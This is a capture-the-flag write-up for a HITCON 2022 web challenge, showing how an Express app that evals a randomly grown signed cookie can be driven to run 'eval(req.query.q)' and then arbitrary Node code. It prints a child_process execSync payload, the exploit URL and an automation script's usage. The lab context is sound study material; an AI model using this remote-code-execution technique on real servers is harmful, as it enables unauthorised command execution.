# HITCON CTF 2022 - 🎲 RCE

| Tags       | Category | Author                                    |
|------------|----------|-------------------------------------------|
| `beginner` | `web`    | [splitline](https://github.com/splitline) | 

Challenge URL: https://ctf2022.hitcon.org/dashboard/#13

## Challenge:

Hello, I am a Random Code Executor, I can execute r4Nd�M JavaScript code for you ><

Tips:
Have you ever heard of [Infinite monkey theorem](https://en.wikipedia.org/wiki/Infinite_monkey_theorem)? If you click the "RCE!" button enough times you can get the flag

## Solution:

We are presented with a link to a webpage, as well as a [zip file](./assets/rce-4bc5d3c73ac0fd8c0b098e9e7ac5a2e1c7a2fcf6.zip). Let's first take a look at the website:

[<img src="./assets/screen1.png" alt="screen1.png" width="800"/>](./assets/screen1.png)

If we click on the `RCE!` button, the loading bar fills slowly. Afterwards, we are presented with the following message:

[<img src="./assets/screen2.png" alt="screen2.png" width="800"/>](./assets/screen2.png)

It looks like it is actually executing *random* code.

Inside the [zip file](./assets/rce-4bc5d3c73ac0fd8c0b098e9e7ac5a2e1c7a2fcf6.zip), we find the source files for the service. It is an express server with a single [app.js](./assets/app.js). Conveniently, a [Dockerfile](./assets/Dockerfile) is already provided to run the service, so we build the image and run the app ourselves for testing purposes:

```bash
docker build -t rce-service --build-arg AUTO_DESTROY=9999 .
docker run -d -p 5000:5000 rce-service
```

Now the service is reachable at http://localhost:5000.

Also, if we take a closer look at the [Dockerfile](./assets/Dockerfile), we can see where to find the flag. It is written into a file at `/flag-<random_hex_bytes>`. So, our goal is to find a way to read the contents of that.

If we now inspect the [app.js](./assets/app.js), we see a small express app. Two routes are registered:

- `/` sends the [index.html](./assets/index.html) as well as an empty, signed cookie called `code`.
- `/random` checks the length of the code in that signed cookie. 
    - If it consists of 20 characters or more, it is put into `eval()` and the result is returned. 
    - If it is shorter than that, a random byte is added to the code in the cookie and no code is executed.

So, it uses the signed cookie to execute random code. As the cookie is signed, it is not possible to simply put our own code in the cookie.

Nonetheless, this behavior still enables us to execute any arbitrary code and here is how:

1. Pad the code you want to have executed with '`;`', as it needs to be of length 20. Only then it is executed.
2. Query `/` for an empty cookie
3. Query `/random` with the empty cookie.
    - If it does not contain the first byte of the desired code, repeat this step until it does.
4. Continue querying `/random` with the returned cookie until it contains the code you want to have executed.

One possible payload would be this:
```javascript
require('child_process').execSync('cat /flag-*')
```

There is only one last hurdle with this: The code is executed once it consists of **20 or more** characters. We can't make it any longer. This makes reading the flag file a bit harder as our payload exceeds this.

A solution for this is to provide the payload somewhere else and access it with the code from the cookie, for example in a GET parameter. The code in the cookie then needs to contain something like this: 
```javascript
eval(req.query.q)
```

If we have that prepared in the cookie, we can simply query the following URL and get the flag from the service's response:

http://localhost:5000/random?q=require(%27child_process%27).execSync(%27cat%20/flag-*%27)

Response: `Executing 'eval(req.query.q);;;', result = hitcon{REDACTED}`

I have implemented this in [executor.py](executor.py) which can be used like this[^1].:

```bash
python -u executor.py "http://url.to.instance/" "code to execute"
```

So, for example:

```bash
$ python -u executor.py "http://localhost:5000/" "require('child_process').execSync('cat /flag-*')"
Code to eval: require('child_process').execSync('cat /flag-*')
Generate cookie for: eval(req.query.q);;; (hex: 6576616c287265712e71756572792e71293b3b3b)
|                Progress                |
 ########################################
Executing 'eval(req.query.q);;;', result = hitcon{REDACTED}
```


[^1]: The `-u` is only necessary to have a better output for the (admittedly hacky) process bar.